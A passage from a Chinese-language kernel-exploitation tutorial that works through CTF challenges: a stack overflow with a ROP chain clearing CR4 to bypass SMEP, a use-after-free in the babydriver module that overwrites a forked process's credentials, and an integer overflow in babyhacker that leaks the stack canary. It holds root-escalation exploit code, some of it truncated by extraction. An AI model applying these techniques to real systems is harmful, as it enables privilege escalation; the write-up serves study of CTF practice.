    #include 
    int main(void){
        char Send_data[0x30];
        char Padding[0x29] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        char Eip[4] = "xEFxBExADxDE";
        strcat(Send_data,Padding);
        strcat(Send_data,Eip);
        int fd = open("/dev/bof",2);
        write(fd,Send_data,0x30);
        return 0;
    }
    //gcc -m32 -static -o Exploit Exploit.c
发现符合预期。
那么因为`SMEP`的存在我们不能再使用和`Buffer overflow basic
1`相同的思路，也就是说，执行完`commit_creds(prepare_kernel_cred(0));`后将不被允许继续执行用户态代码。
###  Bypass SMEP
内核是根据`CR4`寄存器的值来判断`smep`保护是否开启的，当`CR4`寄存器的第`20`位是`1`时，保护开启；是`0`时，保护关闭。以下是`CR4`寄存器的各标志位：
那么，如果在内核中存在`gadget`能让我们修改`CR4`寄存器的值我们就可以手动来关闭`SMEP`保护了。
首先我们需要从`bzImage`中提取静态编译未经过压缩的`kernel`文件，以协助我们找到合适的`gadget`。
这里使用[extract-vmlinux](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux)来提取，使用命令为:`./extract-vmlinux bzImage > vmlinux`
接下来由于`vmlinux`过大，因此建议把分析出的`gadget`重定向到文件然后在文件中寻找`gadget`而不是直接以标准输出打印，命令为`ROPgadget
--binary ./vmlinux > gadgets`。
发现程序中有四个`mov cr4,eax`的`gadget`，同时也有`pop
eax`的`gadget`，于是我们可以利用这两个`gadget`控制`cr4`寄存器的值为`0x6d0`进而关闭`SMEP`保护了。
于是我们最终选用的两个`gadget`分别为：
    0xc10174fc : pop eax ; ret
    0xc1045053 : mov cr4, eax ; pop ebp ; ret
于是此时的PoC为：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    int main(void){
        char Get_shell[5];
        init_tf_work();
        *((void**)(Get_shell)) = &payload;
        char Payload[0x100] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxFCx74x01xC1xD0x06x00x00x53x50x04xC1x00x00x00x00xEFxBExADxDE";
        for(int i = 0,j = 56;i 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    struct trap_frame{
        void *eip;
        uint32_t cs;
        uint32_t eflags;
        void *esp;
        uint32_t ss;
    }__attribute__((packed));
    struct trap_frame tf;
    static char receive[256];
    void get_shell(void){
        execl("/bin/sh", "sh", NULL);
    }
    void init_tf_work(void){
        asm("pushl %cs;popl tf+4;"    //set cs
            "pushfl;popl tf+8;"       //set eflags
            "pushl %esp;popl tf+12;"
            "pushl %ss;popl tf+16;");
        tf.eip = &get_shell;
        tf.esp -= 1024;
    }
    #define KERNCALL __attribute__((regparm(3)))
    void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xC10711F0;
    void* (*commit_creds)(void*) KERNCALL = (void*) 0xC1070E80;
    void payload(void){
        commit_creds(prepare_kernel_cred(0));
        asm("mov $tf,%esp;"
              "iret;");
    }
    int main(void){
        char Get_shell[5];
        init_tf_work();
        *((void**)(Get_shell)) = &payload;
        char Payload[0x100] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxFCx74x01xC1xD0x06x00x00x53x50x04xC1x00x00x00x00";
        for(int i = 0,j = 56;i /dev/console
    exec 2>/dev/console
    insmod /lib/modules/4.4.72/babydriver.ko
    chmod 777 /dev/babydev
    echo -e "nBoot took $(cut -d' ' -f1 /proc/uptime) secondsn"
    setsid cttyhack setuidgid 1000 sh
    umount /proc
    umount /sys
    poweroff -d 0  -f
发现本次的文件系统没有加载共享文件夹，这将导致我们每次写完`PoC`都需要将`PoC`重打包进文件系统。
🚫：经过进一步测试发现，Kernel文件不支持9p选项，因此无法通过修改`Init`的方式来挂载共享文件夹。
然后我们需要重打包文件系统，使用命令`find . | cpio -o --format=newc > rootfs.cpio`。
###  调试信息
`QEMU`启动指令：
    qemu-system-x86_64 -s 
    -initrd rootfs.cpio 
    -kernel bzImage 
    -fsdev local,security_model=passthrough,id=fsdev-fs0,path=/home/error404/Desktop/CTF_question/Kernel/babydriver/Share 
    -device virtio-9p-pci,id=fs0,fsdev=fsdev-fs0,mount_tag=rootme 
    -cpu kvm64,+smep
因为`boot.sh`中涉及到了`KVM`技术，而在虚拟机中的Ubuntu再启动虚拟化是很麻烦的，因此可以直接修改启动指令为以上指令。
###  LKMs文件分析
####  题目逻辑分析
可以发现，本题中提供了`ioctl`函数，这给了我们更多的交互方式。
#####  babyioctl
程序定义了一个命令码`0x10001`，在这个命令码下，程序将会释放`device_buf`指向的`Chunk`，并且申请一个用户传入大小的`Chunk`给`device_buf`，然后将这个大小赋给`device_buf_len`。
#####  babyopen
在打开设备时，程序即会申请一个64字节大小的`Chunk`给`device_buf`，然后将这个大小赋给`device_buf_len`。
#####  babywrite
向`device_buf`指向的`Chunk`写入值，写入长度不得超过`device_buf_len`。
#####  babyread
从`device_buf`指向的`Chunk`向用户返回值，返回长度不得超过`device_buf_len`。
#####  babyrelease
释放`device_buf`指向的`Chunk`。
####  题目漏洞分析
可以发现，本次题目中的函数没有之前见到过的栈溢出或者空指针引用等漏洞。
需要注意，在Kernel中，如果用户态程序多次打开同一个字符设备，那么这个字符设备的线程安全将由字符设备本身来保证，即有没有在open函数相关位置进行互斥锁的设置等。这个题目给出的设备显然没有实现相关机制。
那么，如果我们打开两次`LKMs`，两个`LKMs`的`babydev_struct.device_buf`将指向同一个位置，也就是说，后一个LKMs的`babydev_struct.device_buf`将覆盖前一个LKMs的`babydev_struct.device_buf`。若此时第一个`LKMs`执行了释放操作，那么第二个`LKMs`的`babydev_struct.device_buf`事实上将指向一块已经被释放了的内存，这将导致`Use-After-Free`漏洞的发生。
我们在Kernel Pwn 学习之路(一)中说明过一个`struct cred -进程权限结构体`，它将记录整个进程的权限，那么，如果我们能将这个结构体篡改了，我们就可以提升整个进程的权限，而结构体必然需要通过内存分配，我们可以利用`fork函数`将一个进程分裂出一个子进程，此时，父进程将与子进程共享内存空间，而子进程被创建时必然也要创建对应的`struct
cred`，此时将会把第二个`LKMs`的`babydev_struct.device_buf`指向的已释放的内存分配走，那么此时我们就可以修改`struct
cred`了。
###  Final Exploit
根据我们的思路，我们可以给出以下的Expliot：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    int main()
    {
        int fd1 = open("/dev/babydev", 2);
        int fd2 = open("/dev/babydev", 2);
        // 修改device_buf_len 为 sizeof(struct cred)
        ioctl(fd1, 0x10001, 0xA8);
        // 释放fd1，此时，LKMs2的device_buf将指向一块大小为sizeof(struct cred)的已free的内存
        close(fd1);
        // 新起进程的 cred 空间将占用那一块已free的内存
        int pid = fork();
        if(pid /dev/null
本题依然没有给出共享文件夹，因此仍需要在利用时重打包文件系统。
Kernel开启了`SEMP`、`SAMP`、`KASLR`保护。
###  LKMs文件分析
`LKMs`文件启动了`Canary`防护。
####  题目逻辑分析
#####  babyhacker_ioctl
程序定义了三个命令码`0x30000`、`0x30001`、`0x30002`。
在`0x30000`命令码下，程序会将`buffersize`置为我们输入的参数。(最大为10)
在`0x30001`命令码下，程序会将我们输入的参数写到栈上。
在`0x30002`命令码下，程序会将栈上数据输出。
####  题目漏洞分析
当我们设置参数时，程序会将我们的输入转为有符号整数进行上限检查，而没有进行下限检查，这会导致整数溢出的发生。也就是说，当我们输入的`buffersize`为-1时，我们事实上可以对栈上写入一个极大值。
####  泄露栈上数据
由于程序开启了`KASLR`保护，因此我们需要从栈上泄露一些数据，我们构造如下PoC：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    uint64_t u64(char * s){
        uint64_t result = 0;
        for (int i = 7 ; i >=0 ;i--){
            result = (result 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    uint64_t u64(char * s){
        uint64_t result = 0;
        for (int i = 7 ; i >=0 ;i--){
            result = (result << 8) | (0x00000000000000ff & s[i]);
        }
        return result;
    }
    int main()
    {
        char leak_value[0x1000];
        unsigned long Send_value[0x1000];
        int fd1 = open("/dev/babyhacker", O_RDONLY);
        save_status();
        ioctl(fd1, 0x30000, -1);
        ioctl(fd1, 0x30002, leak_value);
        // for(int i = 0 ; i * 8 < 0x1000 ; i++ ){
        //     uint64_t tmp = u64(&leak_value[i * 8]);
        //     printf("naddress %d: %pn",i * 8 ,tmp);
        // }
        uint64_t Canary = u64(&leak_value[10 * 8]);
        printf("nCanary: %pn",Canary);
        for(int i = 0 ; i < 40 ; i++ )
            Send_value[i] = 0;
        Send_value[40] = Canary;
        Send_value[41] = 0;
        Send_value[42] = 0xDEADBEEF; 
        ioctl(fd1, 0x30001, Send_value);
        return 0;
    }
那么按照预期，程序应该会因为EIP处为`0xDEADBEEF`这个不合法地址而断电。
结果确实如此。
####  Bypass SEMP & Bypass kASLR